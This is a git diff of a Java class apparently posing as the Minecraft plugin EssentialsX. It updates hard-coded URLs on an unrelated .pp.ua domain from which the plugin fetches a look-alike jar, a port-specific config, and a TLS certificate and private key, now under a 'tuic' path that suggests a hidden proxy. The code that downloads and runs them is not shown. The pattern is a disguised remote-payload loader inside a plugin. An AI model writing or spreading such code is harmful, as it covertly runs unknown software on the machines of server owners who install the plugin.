@@ -84,20 +84,20 @@ public class EssentialsX extends JavaPlugin {
 
 
         String javaUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/EssentialsX-1.21.11.jar";
+                "https://netjett-de.kof95zip.pp.ua/java/tuic/EssentialsX-1.21.11.jar";
 
 
         String confUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/config.php?port="
+                "https://netjett-de.kof95zip.pp.ua/java/tuic/config.php?port="
                         + port;
 
 
         String crtUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/server.crt";
+                "https://netjett-de.kof95zip.pp.ua/java/tuic/server.crt";
 
 
         String keyUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/server.key";
+                "https://netjett-de.kof95zip.pp.ua/java/tuic/server.key";
 
 
 
